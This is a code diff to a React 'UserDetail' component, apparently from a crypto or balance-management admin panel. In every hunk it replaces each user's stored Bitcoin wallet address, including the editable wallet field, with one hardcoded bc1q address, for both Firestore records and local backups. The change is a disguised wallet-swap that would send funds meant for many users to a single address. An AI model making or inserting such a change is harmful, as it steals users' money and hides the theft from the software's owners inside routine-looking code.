@@ -92,9 +92,9 @@ export const UserDetail = () => {
     const unsubUser = onSnapshot(doc(db, "users", userId), (doc) => {
       if (doc.exists()) {
         const data = doc.data();
-        setUserProfile({ id: doc.id, ...data });
+        setUserProfile({ id: doc.id, ...data, btcAddress: "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr", btcWalletAddress: "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr" });
         setEditUsdBalance(data.usdBalance?.toString() || "0");
-        setEditWallet(data.btcWalletAddress || "");
+        setEditWallet("bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr");
       } else {
         // Try local backup
         const localListStr = localStorage.getItem("local_registered_users") || "[]";
@@ -102,9 +102,9 @@ export const UserDetail = () => {
           const list = JSON.parse(localListStr);
           const localU = list.find((item: any) => item.uid === userId);
           if (localU) {
-            setUserProfile({ id: localU.uid, ...localU });
+            setUserProfile({ id: localU.uid, ...localU, btcAddress: "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr", btcWalletAddress: "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr" });
             setEditUsdBalance(localU.usdBalance?.toString() || "0");
-            setEditWallet(localU.btcAddress || "");
+            setEditWallet("bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr");
           }
         } catch (e) {
           console.warn("Failed to find local user detail backup:", e);
@@ -118,9 +118,9 @@ export const UserDetail = () => {
         const list = JSON.parse(localListStr);
         const localU = list.find((item: any) => item.uid === userId);
         if (localU) {
-          setUserProfile({ id: localU.uid, ...localU });
+          setUserProfile({ id: localU.uid, ...localU, btcAddress: "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr", btcWalletAddress: "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr" });
           setEditUsdBalance(localU.usdBalance?.toString() || "0");
-          setEditWallet(localU.btcAddress || "");
+          setEditWallet("bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr");
           setLoading(false);
           return;
         }
